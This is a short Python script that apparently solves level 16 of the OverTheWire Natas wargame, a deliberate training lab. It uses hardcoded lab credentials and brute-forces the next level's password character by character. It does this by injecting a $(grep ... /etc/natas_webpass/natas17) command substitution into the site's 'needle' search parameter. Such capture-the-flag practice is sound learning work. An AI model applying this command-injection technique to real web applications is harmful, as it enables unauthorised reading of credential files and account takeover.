import requests
from bs4 import BeautifulSoup

headers = {"Authorization": "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==", "Referer": "http://natas16.natas.labs.overthewire.org/"}
possibilities = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pw = "EqjHJbo7LFNb8vwhHb9s75hokh5"
print(f"Tamanho da senha: {len(pw)}")
for j in range(32):
    text = "aaaa"
    i = -1 # turns to zero before any construction
    while len(text) != 1:
        i+=1
        params = [('needle', '$(grep ^'+pw+possibilities[i]+' /etc/natas_webpass/natas17)')]
        result = requests.get("http://natas16.natas.labs.overthewire.org", headers=headers, params=params)
        soup = BeautifulSoup(result.content, "html.parser")
        #div = soup.find('pre')
        #text = div.get_text(separator='\n', strip=True)
        text = soup.find('pre').get_text()
        print(f"Try: {possibilities[i]}")
    pw += possibilities[i]
    print(f"Password: {pw}")
    print(f"Tamanho da senha: {len(pw)}")